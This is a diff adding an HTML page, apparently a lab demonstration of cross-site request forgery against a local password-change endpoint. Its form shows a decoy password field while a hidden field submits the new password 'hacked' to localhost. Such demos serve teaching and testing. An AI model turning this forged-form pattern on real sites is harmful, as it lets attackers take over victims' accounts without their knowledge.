@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Demo – Unauthorized Password Change</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: #ebebeb;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .form-wrapper {
+            padding: 15px;
+            border: 1px solid #333;
+            margin-bottom: 10px;
+            border-radius: 10px;
+            background-color: #2a2a2a;
+            width: 400px;
+            max-width: 100%;
+        }
+        h2 {
+            color: #ebebeb;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+            color: #ebebeb;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            background-color: #F7F9FA;
+            color: black;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #007BFF;
+            color: #FFF;
+            padding: 10px;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        button:active {
+            background-color: #004392;
+        }
+        .message {
+            text-align: center;
+            margin-bottom: 15px;
+            color: red;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+<div class="form-wrapper">
+    <h2>Change password</h2>
+    <p class="message">
+        CSRF attack example<br>
+    </p>
+    <form action="http://localhost:8080/user/change-password" method="post">
+        <label for="fakePassword">New password:</label>
+        <input type="password" id="fakePassword">
+        <input type="hidden" name="newPassword" value="hacked">
+        <button type="submit">Change password</button>
+    </form>
+</div>
+</body>
+</html>
